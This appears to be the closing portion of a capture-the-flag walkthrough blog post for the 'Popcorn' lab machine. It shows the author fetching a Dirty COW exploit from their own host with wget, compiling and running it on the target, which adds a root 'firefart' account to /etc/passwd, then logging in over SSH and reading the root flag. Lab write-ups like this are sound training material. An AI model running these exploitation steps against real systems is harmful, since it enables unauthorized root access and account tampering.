+2025-01-17 18:07:09 <span class="o">(</span>102 MB/s<span class="o">)</span> - ‘dirty.c’ saved <span class="o">[</span>5006/5006]
+</code></pre></div></div> <p><br> Compile the exploit.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="o">[</span>★]<span class="nv">$ </span>gcc <span class="nt">-pthread</span> dirty.c <span class="nt">-o</span> dirty <span class="nt">-lcrypt</span>
+</code></pre></div></div> <p><br> Transfer the compiled exploit to the victim machine.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@popcorn:/dev/shm<span class="nv">$ </span>wget http://10.10.14.29:8000/dirty
+wget http://10.10.14.29:8000/dirty
+<span class="nt">--2025-01-18</span> 02:10:33--  http://10.10.14.29:8000/dirty
+Connecting to 10.10.14.29:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 17512 <span class="o">(</span>17K<span class="o">)</span> <span class="o">[</span>application/octet-stream]
+Saving to: <span class="sb">`</span>dirty<span class="s1">'
+
+100%[======================================&gt;] 17,512      --.-K/s   in 0.1s    
+
+2025-01-18 02:10:33 (179 KB/s) - `dirty'</span> saved <span class="o">[</span>17512/17512]
+
+www-data@popcorn:/dev/shm<span class="nv">$ </span><span class="nb">chmod</span> +x dirty
+<span class="nb">chmod</span> +x dirty
+</code></pre></div></div> <p><br> Try to run the exploit and notice the error.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@popcorn:/dev/shm<span class="nv">$ </span>./dirty
+./dirty
+bash: ./dirty: cannot execute binary file
+</code></pre></div></div> <p><br> Transfer the dirty.c source file to the victim machine.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@popcorn:/dev/shm<span class="nv">$ </span>wget http://10.10.14.29:8000/dirty.c <span class="nt">-O</span> dirty.c
+wget http://10.10.14.29:8000/dirty.c <span class="nt">-O</span> dirty.c
+<span class="nt">--2025-01-18</span> 02:13:55--  http://10.10.14.29:8000/dirty.c
+Connecting to 10.10.14.29:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5006 <span class="o">(</span>4.9K<span class="o">)</span> <span class="o">[</span>text/x-csrc]
+Saving to: <span class="sb">`</span>dirty.c<span class="s1">'
+
+100%[======================================&gt;] 5,006       --.-K/s   in 0s      
+
+2025-01-18 02:13:55 (396 MB/s) - `dirty.c'</span> saved <span class="o">[</span>5006/5006]
+</code></pre></div></div> <p><br> Compile the source code on the victim machine.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@popcorn:/dev/shm<span class="nv">$ </span>gcc <span class="nt">-pthread</span> dirty.c <span class="nt">-o</span> dirty <span class="nt">-lcrypt</span>
+gcc <span class="nt">-pthread</span> dirty.c <span class="nt">-o</span> dirty <span class="nt">-lcrypt</span>
+</code></pre></div></div> <p><br> Run the dirty executable.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@popcorn:/dev/shm<span class="nv">$ </span>gcc <span class="nt">-pthread</span> dirty.c <span class="nt">-o</span> dirty <span class="nt">-lcrypt</span>
+gcc <span class="nt">-pthread</span> dirty.c <span class="nt">-o</span> dirty <span class="nt">-lcrypt</span>
+www-data@popcorn:/dev/shm<span class="nv">$ </span>./dirty
+./dirty
+/etc/passwd successfully backed up to /tmp/passwd.bak
+Please enter the new password: firefart
+
+Complete line:
+firefart:fik57D3GJz/tk:0:0:pwned:/root:/bin/bash
+
+mmap: b789e000
+</code></pre></div></div> <p><br> Ssh in the victim as the new firefart user that was created by the Dirty Cow.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="o">[</span>★]<span class="nv">$ </span>ssh <span class="nt">-oHostKeyAlgorithms</span><span class="o">=</span>+ssh-dss firefart@10.10.10.6
+firefart@10.10.10.6<span class="s1">'s password: 
+Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686
+
+To access official Ubuntu documentation, please visit:
+http://help.ubuntu.com/
+
+  System information as of Sat Jan 18 02:18:54 EET 2025
+
+  System load: 3.06              Memory usage: 7%   Processes:       124
+  Usage of /:  32.6% of 3.56GB   Swap usage:   0%   Users logged in: 0
+
+  Graph this data and manage this system at https://landscape.canonical.com/
+
+Last login: Tue Nov 21 19:24:41 2023 from 10.10.14.23
+firefart@popcorn:~#
+</span></code></pre></div></div> <p><br> Get the root.txt flag.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>firefart@popcorn:~# <span class="nb">cat</span> /root/root.txt
+&lt;redacted&gt;
+firefart@popcorn:~# ifconfig
+eth0      Link encap:Ethernet  HWaddr 00:50:56:b9:46:bf  
+          inet addr:10.10.10.6  Bcast:10.10.11.255  Mask:255.255.254.0
+          inet6 addr: dead:beef::250:56ff:feb9:46bf/64 Scope:Global
+          inet6 addr: fe80::250:56ff:feb9:46bf/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:3958 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:1255 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:1266175 <span class="o">(</span>1.2 MB<span class="o">)</span>  TX bytes:495545 <span class="o">(</span>495.5 KB<span class="o">)</span>
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:96 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:96 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:14520 <span class="o">(</span>14.5 KB<span class="o">)</span>  TX bytes:14520 <span class="o">(</span>14.5 KB<span class="o">)</span>
+</code></pre></div></div> <p><br> Sweet, delicious popcorn.</p> </article> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> © Copyright 2025 Biscotti Diskette. Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js?a0db7e5d5c70cc3252b3138b0c91dcaf" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script src="/assets/js/no_defer.js?2781658a0a2b13ed609542042a859126"></script> <script defer src="/assets/js/common.js?e0514a05c5c95ac1a93a8dfd5249b92e"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script defer src="/assets/js/jupyter_new_tab.js?d9f17b6adc2311cbabd747f4538bb15f"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js" integrity="sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI=" crossorigin="anonymous"></script> <script src="/assets/js/mathjax-setup.js?70d799092f862ad98c7876aa47712e20"></script> <script defer src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script defer src="/assets/js/progress-bar.js?2f30e0e6801ea8f5036fa66e1ab0a71a" type="text/javascript"></script> <script src="/assets/js/vanilla-back-to-top.min.js?f40d453793ff4f64e238e420181a1d17"></script> <script>
+    addBackToTop();
+  </script> </body> </html>
